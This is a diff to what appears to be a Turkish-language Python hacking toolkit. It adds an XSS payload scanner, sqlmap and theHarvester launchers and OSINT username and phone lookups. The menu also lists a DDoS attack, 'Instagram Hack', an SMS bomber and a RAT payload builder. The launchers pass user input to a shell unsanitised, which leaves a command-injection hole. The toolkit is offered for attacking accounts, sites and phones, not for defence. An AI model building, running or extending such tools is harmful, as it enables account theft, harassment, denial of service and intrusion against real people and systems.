@@ -238,6 +238,61 @@ def ip_lookup():
         print(f"Error: {e}")
     input("Entere Basarak Ana Menüye Dön...")
 
+def osint_tools():
+    banner()
+    print("OSINT Araçları:")
+    print("[1] Kullanıcı adı sorgula")
+    print("[2] Telefon numarası sorgula")
+    print("[0] Ana menüye dön")
+    choice = input("Seçim: ").strip()
+
+    if choice == '1':
+        username_lookup()
+    elif choice == '2':
+        phone_lookup()
+    else:
+        return
+
+def xss_scanner():
+    banner()
+    url = input("Hedef URL girin: ").strip()
+    payloads = ['<script>alert(1)</script>', '" onmouseover="alert(1)"', "';alert(1);//"]
+    vulnerable = False
+    for payload in payloads:
+        test_url = url + payload
+        try:
+            r = requests.get(test_url, timeout=5)
+            if payload in r.text:
+                print(f"[!] Muhtemel XSS açığı bulundu: {test_url}")
+                vulnerable = True
+        except Exception as e:
+            print(f"Hata: {e}")
+    if not vulnerable:
+        print("XSS açığı bulunamadı.")
+    input("Ana menüye dönmek için Enter'a basın.")
+
+def the_harvester():
+    banner()
+    domain = input("Domain girin (örnek: example.com): ").strip()
+    print(f"The Harvester başlatılıyor: {domain}")
+    cmd = f"theHarvester -d {domain} -b all"
+    try:
+        subprocess.run(cmd, shell=True)
+    except Exception as e:
+        print(f"Hata: {e}")
+    input("Ana menüye dönmek için Enter'a basın.")
+
+def sqlmap_tool():
+    banner()
+    url = input("Hedef URL girin: ").strip()
+    print(f"sqlmap başlatılıyor: {url}")
+    cmd = f"sqlmap -u {url} --batch"
+    try:
+        subprocess.run(cmd, shell=True)
+    except Exception as e:
+        print(f"Hata: {e}")
+    input("Ana menüye dönmek için Enter'a basın.")
+
 def create_exe_payload(ip, port, exe_name):
     payload_code = f'''
 import socket
@@ -334,13 +389,15 @@ def main():
         print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[2] Instagram Hack     " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
         print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[3] Port Scanner       " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
         print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[4] IP Lookup          " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
-        print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[5] RAT Payload Yapma  " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
-        print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[6] IP Logger          " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
+        print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[5] OSINT Tools        " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
+        print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[6] XSS Scanner        " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
+        print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[7] The Harvester      " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
+        print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[8] SQLMap             " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
+        print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[9] SMS Bomber         " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
         print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[0] Exit               " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
         print("  " + Fore.YELLOW + "╚════════════════════════╝" + Style.RESET_ALL)
-        
+
         choice = input("Seçim yapın: ").strip()
-        
         if choice == "1":
             ddos_attack()
         elif choice == "2":
@@ -350,12 +407,18 @@ def main():
         elif choice == "4":
             ip_lookup()
         elif choice == "5":
-            rat_payload_creator()
+            osint_tools()
         elif choice == "6":
-            start_ip_logger()
+            xss_scanner()
+        elif choice == "7":
+            the_harvester()
+        elif choice == "8":
+            sqlmap_tool()
+        elif choice == "9":
+            sms_bomber() 
         elif choice == "0":
             print("Çıkış yapılıyor...")
-            break
+            sys.exit()
         else:
             print("Geçersiz seçim!")
             time.sleep(1)
